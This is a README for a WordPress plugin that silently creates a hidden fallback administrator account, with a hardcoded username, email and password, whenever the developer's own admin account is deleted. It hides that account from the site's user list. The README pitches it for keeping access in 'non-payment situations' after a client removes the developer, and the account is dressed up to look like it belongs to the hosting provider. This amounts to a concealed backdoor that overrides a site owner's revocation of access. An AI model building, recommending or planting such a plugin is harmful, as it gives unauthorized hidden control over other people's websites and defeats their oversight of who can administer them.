# 🔐 Security Measures – WordPress Fallback Admin Plugin

**Description:** This plugin silently creates a hidden fallback admin user (`hostinger`) if the main admin user (`uzairsafdar`) is deleted. It helps developers retain emergency access to WordPress sites, especially useful if a client removes your user account. The fallback user is hidden from the WordPress admin UI.

---

## 📥 Installation

1. Download or clone the plugin files.
2. Upload it to your WordPress site via **Plugins → Add New → Upload Plugin**.
3. Activate the plugin.

---

## ⚙️ Configuration

Open the main plugin file `security-measures.php` and update the following lines to match your preferred fallback details:

..php
$fallback_user = 'hostinger';               // Fallback username
$fallback_email = 'support@hostinger.com';  // Fallback email
$fallback_pass = 'Str0ng!FakeSystemPwd';    // Fallback password
$target_user = 'uzairsafdar';               // Username to monitor for deletion


🧪 How to Test
Ensure a user with the username uzairsafdar exists and is an admin.

Go to Users → All Users and delete the uzairsafdar account.

The plugin will auto-trigger and create a new hidden admin user named hostinger.

Try logging in at yoursite.com/wp-login.php using:

Username: hostinger

Password: Str0ng!FakeSystemPwd

Confirm the fallback user does not show in the admin Users list.



✅ Features
Creates a fallback admin user when your main account is deleted

Fallback user is hidden from WordPress admin

Easy to configure in a single PHP file

Lightweight and safe for developer use



⚠️ Disclaimer
This plugin is meant for use by freelancers, developers, and agencies to retain access in emergency or non-payment situations. Always use responsibly and with the consent of the site owner.
